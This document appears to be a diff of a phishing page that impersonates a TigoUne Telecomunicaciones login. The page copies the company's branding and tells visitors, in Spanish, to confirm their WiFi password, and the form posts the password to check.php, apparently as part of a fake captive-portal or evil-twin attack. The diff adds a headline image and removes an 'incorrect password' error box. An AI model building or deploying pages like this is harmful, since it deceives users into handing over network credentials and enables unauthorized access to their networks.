@@ -5,7 +5,7 @@
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>TigoUne Login</title>
+        <title>Tigo-UNE Login</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
         <link rel="stylesheet" type="text/css" href="styles/components.css">
@@ -20,7 +20,7 @@
             <div id="tbs-header-content">
                 <div class="container-fixed clearfix">
                     <div class="tbs-text-zero pull-left">
-                        <img id="logo" src="img/tigoune.png" width=90 alt="">
+                        <img id="logo" src="img/tigoune.png"  width=90 alt="">
                     </div>
                 </div>
             </div>
@@ -33,18 +33,21 @@
 
         <!-- CONTENT -->
         <div id="tbs-container">
+            <div id="tbs-headline">
+                <center><img id="happy2" src="img/feliz.png" alt=""></center>
+                <!--<h1 class="text-center marketing-l text-thin tbs-text-1em">Verificaci&oacute;n de seguridad</h1>-->
 
-		<div class="error-box">
-                <div class="error-box__content"><i class="icon icon-large">X</i> Clave incorrecta.</div>
             </div>
-			<div id="tbs-infobox">
+					<div id="tbs-infobox">
 					<center><p>Para continuar navegando de manera segura, debe confirmar su clave WIFI.</p></center>
 					</div>
+
+
             <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8" autocomplete="off">
                 <!-- XSRF Prevention -->
 
 
-                <div class="offset-bottom-4">
+					<div class="offset-bottom-4">
                     <!-- Re-Authentication -->
                     <div class="container offset-bottom-1">
 
@@ -61,13 +64,14 @@
 
                     <!-- Login button -->
 					<br>
-                  <div class="text-center">
-                      <button id="pw_submit" name="pw_submit" type="submit" class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
-                  </div>
+                    <div class="text-center">
+                        <button id="pw_submit" name="pw_submit" type="submit" class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
+                    </div>
                 </div>
             </form>
 
             <div class="text-center">
+
 
 
             </div>
@@ -78,20 +82,20 @@
 
         <!-- FOOTER -->
         <div id="tbs-footer" class="sticky">
-          <div class="container-fixed">
-              <div class="text-small clearfix">
-                  <div class="pull-left">
-                      <p>&copy; 2017 TigoUne Telecomunicaciones</p>
+    <div class="container-fixed">
+        <div class="text-small clearfix">
+            <div class="pull-left">
+                <p>&copy; 2017 TigoUne Telecomunicaciones</p>
 
-                  </div>
-                  <div class="pull-right clearfix">
-                      <div class="pull-left">
-                          <a class="offset-right-4" href="https://www.une.com.co" target="_blank" tabindex="90">Tigo Une</a>
-                      </div>
+            </div>
+            <div class="pull-right clearfix">
+                <div class="pull-left">
+                    <a class="offset-right-4" href="https://www.une.com.co" target="_blank" tabindex="90">TigoUne</a>
+                </div>
 
-                  </div>
-              </div>
-          </div>
+            </div>
+        </div>
+    </div>
 </div>
         <!-- /FOOTER -->
 
